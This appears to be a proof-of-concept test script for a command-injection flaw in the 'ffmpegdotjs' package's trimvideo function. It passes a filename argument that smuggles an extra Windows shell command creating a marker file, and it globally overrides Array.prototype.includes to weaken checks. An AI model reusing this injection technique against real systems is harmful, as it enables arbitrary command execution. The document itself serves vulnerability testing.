Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
let ffmpegdotjs = require('ffmpegdotjs');
const fs = require('fs');
const path = './ffmpegdotjs';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
let file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
console.log(ffmpegdotjs.trimvideo('package-lock.json', 0, 30, `x & fsutil file createnew ffmpegdotjs 0 & rem`).then(() => {
}).catch(err => {
}).finally(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
}));